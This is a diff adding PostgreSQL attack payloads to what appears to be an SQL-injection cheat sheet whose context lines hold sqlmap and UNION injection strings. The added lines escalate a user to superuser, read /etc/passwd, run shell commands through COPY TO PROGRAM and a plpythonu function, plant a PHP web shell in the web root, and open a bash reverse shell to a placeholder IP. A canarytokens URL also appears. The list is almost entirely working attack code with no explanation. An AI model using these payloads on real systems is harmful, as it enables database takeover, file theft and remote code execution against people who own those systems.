@@ -13,3 +13,31 @@ sqlmap -u "http://example.com/vulnerable?param=1" --dbms=oracle --time-sec=5 --t
 ' UNION SELECT NULL, USER, NULL FROM DUAL--
 '/**/OR/**/1=1--
 'uNiOn SeLeCt UsEr FrOm dUaL--
+http://canarytokens.com/terms/agvtylw5cidjccfc5w357jdu9/payments.js
+SELECT rolsuper FROM pg_roles WHERE rolname=current_user;
+ALTER USER <username> WITH SUPERUSER;
+COPY pg_catalog.pg_tables TO '/tmp/tables.txt'; -- Writes table data to a file
+SELECT pg_read_file('/etc/passwd', 0, 1000); -- Reads the first 1000 bytes of /etc/passwd
+COPY (SELECT '') TO PROGRAM 'ls /'; -- Executes "ls /"
+
+CREATE FUNCTION cmd_exec(text) RETURNS void AS $$
+import os
+os.system(args[0])
+$$ LANGUAGE plpythonu;
+SELECT cmd_exec('ls /');
+
+COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
+SELECT encode(pg_read_file('/etc/passwd'), 'base64');
+SELECT * FROM pg_roles;
+SELECT * FROM pg_foreign_server;
+SELECT pg_write_file('/var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>');
+SELECT pg_read_file('/etc/passwd', 0, 1000);
+CREATE EXTENSION plpythonu;
+
+DO $$
+BEGIN
+  PERFORM pg_write_file('/tmp/test.txt', 'This is a test file written by PostgreSQL.');
+END $$ LANGUAGE plpgsql;
+
+CREATE EXTENSION dblink;
+COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"';
